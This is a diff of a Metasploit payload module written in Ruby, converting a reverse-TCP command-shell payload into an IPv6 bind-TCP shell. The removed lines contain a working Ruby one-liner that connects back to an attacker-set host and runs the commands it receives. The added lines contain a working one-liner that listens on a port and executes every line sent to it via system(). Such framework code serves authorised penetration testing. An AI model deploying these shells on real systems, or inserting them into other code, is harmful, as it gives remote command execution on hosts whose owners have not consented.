@@ -6,7 +6,7 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -17,13 +17,13 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'        => 'Ruby Command Shell, Reverse TCP',
-			'Description' => 'Connect back and create a command shell via Ruby',
-			'Author'      => 'kris katterjohn',
+			'Name'        => 'Ruby Command Shell, Bind TCP IPv6',
+			'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
+			'Author'      => [ 'kris katterjohn', 'hdm' ],
 			'License'     => MSF_LICENSE,
 			'Platform'    => 'ruby',
 			'Arch'        => ARCH_RUBY,
-			'Handler'     => Msf::Handler::ReverseTcp,
+			'Handler'     => Msf::Handler::BindTcp,
 			'Session'     => Msf::Sessions::CommandShell,
 			'PayloadType' => 'ruby',
 			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
@@ -35,8 +35,6 @@ module Metasploit3
 	end
 
 	def ruby_string
-		lhost = datastore['LHOST']
-		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		"require 'socket';c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"
+		"require 'socket';s=TCPServer.new(\"::\",\"#{datastore['LPORT']}\");c=s.accept;s.close;$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;system(l)}"
 	end
 end
